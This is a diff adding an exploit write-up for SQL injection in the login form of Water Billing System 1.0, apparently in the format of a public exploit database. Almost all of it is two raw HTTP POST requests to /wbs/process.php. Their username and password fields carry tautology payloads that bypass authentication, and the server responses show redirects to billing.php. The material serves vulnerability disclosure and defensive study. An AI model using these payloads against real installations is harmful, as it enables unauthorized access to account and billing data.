@@ -1,0 +1,71 @@
+# Exploit Title: Water Billing System 1.0 - 'username' and 'password' parameters SQL Injection
+# SQL Injection in  'username' and 'password' parameters allows attacker to run the SQL commands on the victim to extract entire DB. In advanced exploitation, an attacker can run the arbitrary code on the victim system to compromise it...
+# Exploit Author: Sarang Tumne (CyberInsane)
+# Date: 4th Nov, 2020
+# Confirmed on release 1.0
+# Tested on: Windows Server 2016- XAMPP
+# Vendor: https://www.sourcecodester.com/php/14560/water-billing-system-phpmysqli-full-source-code.html
+###############################################
+
+POST /wbs/process.php HTTP/1.1
+Host: 192.168.56.102:8080
+Content-Length: 45
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.56.102:8080
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.56.102:8080/wbs/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username='%20or%200%3d0%20#&password=password
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Mon, 02 Nov 2020 04:30:51 GMT
+Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.30
+X-Powered-By: PHP/7.2.30
+Set-Cookie: PHPSESSID=4q8t10sshr36he7sl19hb563a0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 48
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script>windows: location="billing.php"</script>
+=========================================================================
+POST /wbs/process.php HTTP/1.1
+Host: 192.168.56.102:8080
+Content-Length: 48
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.56.102:8080
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.56.102:8080/wbs/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username=admin&password=a'%20or%20'a'%20%3d%20'a
+
+Response:
+HTTP/1.1 200 OK
+Date: Mon, 02 Nov 2020 04:30:49 GMT
+Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.30
+X-Powered-By: PHP/7.2.30
+Set-Cookie: PHPSESSID=34a478h4bhtliatg8l71kmp10r; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 48
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<script>windows: location="billing.php"</script>
